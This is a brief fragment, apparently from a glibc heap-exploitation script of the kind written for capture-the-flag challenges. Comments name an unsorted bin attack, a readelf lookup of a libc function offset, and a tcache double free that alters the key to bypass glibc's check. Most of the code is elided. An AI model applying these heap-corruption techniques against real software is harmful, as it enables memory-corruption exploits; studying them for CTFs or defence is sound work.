...
# This part is also known as Unsorted bin attack
...
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "TARGET_FUNCTION"
...
if sys.argv[1] == '1':
    ...
    # double free in tcache, key is altered to bypass the validation
    release(1)
